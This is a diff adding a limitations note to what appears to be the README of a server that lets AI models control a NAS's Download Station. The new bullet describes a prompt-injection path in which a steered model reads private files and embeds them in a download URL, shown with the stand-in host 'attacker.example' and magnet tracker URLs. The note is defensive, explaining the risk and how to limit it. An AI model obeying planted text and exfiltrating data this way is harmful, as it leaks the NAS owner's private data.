@@ -40,6 +40,14 @@ makes sure it can't pass for the server's own text.
   public name whose DNS answers with an internal address, a public server that redirects to
   one, and the trackers inside a `.torrent` file (#765) aren't caught. The NAS's own network
   rules are what's left there.
+- **It can't stop a download from carrying data out.** `create_download` is a way off the
+  NAS: Download Station fetches every public source it's given. A model steered by planted
+  text could read something private with the read tools and put it into a source URI
+  (`https://attacker.example/?d=…`, or a magnet link's tracker URLs), and the NAS's fetch
+  would deliver it. Scanners flag this as a cross-tool "toxic flow": untrusted text, private
+  data and a way to send it out in one tool set. To remove that leg, give Download Station
+  `permission: read`, or leave it out of `modules:`, wherever you don't need new downloads;
+  an opt-in list of allowed hosts is #772.
 - **It can't stop a model from following text.** A model may still act on planted text. Use a
   read-only connection (`permission: read`) where you don't need writes, and an account with
   only the shared folders it needs.
